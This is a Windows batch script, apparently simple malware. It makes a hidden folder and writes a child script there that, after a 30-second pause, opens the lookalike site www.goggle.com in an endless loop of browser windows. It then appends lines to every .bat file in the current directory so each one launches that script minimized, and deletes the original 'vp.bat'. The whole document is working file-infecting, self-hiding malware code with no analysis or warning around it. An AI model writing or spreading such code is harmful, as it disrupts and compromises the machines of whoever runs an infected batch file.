@echo off 
mkdir nuoc
attrib +h nuoc
cd nuoc
echo timeout 30 > figlio.bat
echo :1 >>  figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo start www.goggle.com >> figlio.bat 
echo goto 1 >> figlio.bat
cd ..
copy vp.bat nuoc
for %%a in (*.bat) do echo .>> %%a
for %%a in (*.bat) do echo cd nuoc >> %%a 
for %%a in (*.bat) do echo start /min figlio.bat >> %%a
del vp.bat
exit 
